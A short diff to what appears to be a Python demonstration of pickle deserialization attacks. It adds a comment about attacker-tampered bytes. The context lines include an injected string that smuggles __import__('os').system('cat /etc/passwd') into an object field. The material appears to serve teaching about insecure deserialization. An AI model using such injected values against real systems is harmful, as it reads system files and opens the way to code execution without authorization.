@@ -24,6 +24,7 @@ print(serialized)
 print(deserialized)
 
 # Now, let's try to exploit the pickle payload
+# This can be done if the bytes to deserialize are tampered by the attacker
 evil_example = ExampleClass("Alice\"),__import__('os').system('cat /etc/passwd'),print(\"")
 serialized = pickle.dumps(evil_example)
 print(pickle.loads(serialized))
